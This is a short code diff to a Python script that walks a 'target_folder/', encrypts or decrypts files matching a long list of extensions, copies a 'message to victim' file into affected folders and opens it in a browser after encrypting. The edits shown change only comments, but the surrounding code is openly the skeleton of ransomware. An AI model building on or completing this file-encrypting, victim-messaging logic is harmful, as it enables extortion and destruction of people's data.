@@ -13,7 +13,7 @@ def main():
     key = createKey()
     mode = input('Select "encrypt" or "decrypt": ')
 
-    # Specify the root directory and get a list of files
+    # Specify the root directory
     path = "target_folder/"
 
     # File to display message to victim
@@ -26,9 +26,13 @@ def main():
            '.manifest', '.lrc', '.html5', '.linux', '.sha1', '.sha512',
            '.err', '.readme', '.man', '.encrypted')
 
-    # Search the filesystem. For each file found, check if the extension is
-    # on the supported list. If it is, create a full filename including
-    # the path and pass it to either encrypt or decrypt depending on the mode
+    '''
+    Search the filesystem. For each file found, check if the extension is
+    on the supported list. If it is, create a full filename including
+    the path and pass it to either encrypt or decrypt depending on the mode.
+    If encrypting, copy the message file to each folder with encrypted files.
+    If decrypting, delete the message file from those folders.
+    '''
     for root, subdir, files in os.walk(path):
         check = 0
         for filename in files:
@@ -45,6 +49,7 @@ def main():
                     else:
                         decrypt(key, mode, filename)
 
+    # When encryption is finished, open the browser and display the message.
     if mode == 'encrypt':
         webbrowser.open(message_to_victim, new=1)
 
